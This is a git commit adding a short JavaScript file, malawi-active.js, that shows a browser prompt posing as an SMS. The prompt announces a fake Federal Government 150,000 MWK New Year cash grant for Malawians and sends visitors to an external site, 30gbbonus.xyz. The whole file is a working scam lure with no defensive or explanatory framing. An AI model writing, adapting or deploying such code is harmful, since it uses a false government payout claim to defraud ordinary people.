267922b7affba483f53c124f13a10ca6522b6f75
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-12-27 00:51:25 -0800

    Create malawi-active.js

---
+++ malawi-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW 150,000MWK'
+password=prompt('SMS: Congratulations You are qualify for Federal Government 150,000MWK NEW YEAR CASH GRANT FOR MALAWIAN, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW 150,000MWK');
+if (password != 'WITHDRAW 150,000MWK') {
+location.href='https://30gbbonus.xyz/malawi-grant.html';
+}
